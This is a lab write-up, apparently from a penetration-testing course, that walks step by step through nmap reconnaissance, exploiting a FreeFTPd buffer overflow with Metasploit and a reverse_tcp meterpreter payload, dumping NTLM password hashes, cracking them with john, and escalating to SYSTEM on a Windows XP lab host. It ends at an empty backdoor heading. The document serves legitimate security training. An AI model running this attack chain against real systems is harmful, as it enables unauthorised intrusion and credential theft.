# Metasploit Lab

## Description

In this lab, you will have to use Metasploit and meterpreter against a real
machine; this will help you become familiar with the Metasploit framework and
its features.

## Goals

- Identify the target machine on the network
- Find a vulnerable service
- Exploit the service by using Metasploit to get a meterpreter session
- Gather information from the machine by using meterpreter commands
- Retrieve the password hashes from the exploit machine
- Search for a file named \"Congrats.txt\"

## Recon

After connecting to the Hera Lab VPN, it is time to search for a vulnerable
target. I used nmap for this:

```
  $ nmap -sV -oN nmap_scan.txt 192.168.99.100/24 
  Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-23 12:43 EST
  Nmap scan report for 192.168.99.12
  Host is up (0.059s latency).
  Not shown: 994 closed ports
  PORT     STATE SERVICE       VERSION
  21/tcp   open  ftp           FreeFTPd 1.0
  22/tcp   open  ssh           WeOnlyDo sshd 2.1.8.98 (protocol 2.0)
  135/tcp  open  msrpc         Microsoft Windows RPC
  139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
  445/tcp  open  microsoft-ds  Microsoft Windows XP microsoft-ds
  3389/tcp open  ms-wbt-server Microsoft Terminal Services
  Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, 
  cpe:/o:microsoft:windows_xp

```

From the scan we see that the IP address 192.168.99.12 has several services
running on it. Time to open up metasploit and determine which service is
vulnerable for exploit.

## Vulnerability Assessment

Searching for the FreeFTPd service in msfconsole yields the following results:

```
msf6 > search FreeFTPd 1.0

Matching Modules
================

   #  Name                                       Disclosure Date  Rank     Check  Description
   -  ----                                       ---------------  ----     -----  -----------
   0  exploit/windows/ftp/freeftpd_pass          2013-08-20       normal   Yes    freeFTPd PASS Command Buffer Overflow
   1  exploit/windows/ftp/freeftpd_user          2005-11-16       average  Yes    freeFTPd 1.0 Username Overflow
   2  exploit/windows/ssh/freeftpd_key_exchange  2006-05-12       average  No     FreeFTPd 1.0.10 Key Exchange Algorithm String Buffer Overflow

```

I chose the first exploit since it has the most recent disclosure data and higher rank. I left the default
payload as windows/meterpreter/reverse_tcp shell. 

The only options we need to change are the remote and local hosts:

```
set RHOSTS 192.168.99.12
set LHOST  192.168.99.100
```


## Exploitation
 
Run the exploit to spawn a meterpreter session.

### Cracking hashes

Once inside meterpreter, run the hashdump command:

```
meterpreter> hashdump
Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
eLSAdmin:1003:aad3b435b51404eeaad3b435b51404ee:87289513bddc269f9bcb24d74864beb2:::
ftp:1004:4ff1ab31fc4b0ebdaad3b435b51404ee:9865c4bdcd9578a380297c5095e6c852:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HelpAssistant:1000:a88f7de3e682d17fea34bd03086620b5:2b07e52daf608f50d4cd9506c5b0220d:::
SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:9f79c84005db73e0122f424022f8dbc0:::
```

I copied the output to a file named hashdump.txt and fed it to john:

```
$ john hashdump.txt
```

### Escalate Privileges

We can escalate our privileges with the getsystem command:

```
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

### Print Congrats.txt

The Congrats.txt file can easily be found with the search command:

```
meterpreter > search -f Congrats.txt
Found 1 result...
    c:\Documents and Settings\eLSAdmin\My Documents\Congrats.txt (64 bytes)
meterpreter > cat "c:\Documents and Settings\eLSAdmin\My Documents\Congrats.txt"
    Congratulations! You have successfully exploited this machine!
```

## Install a Backdoor


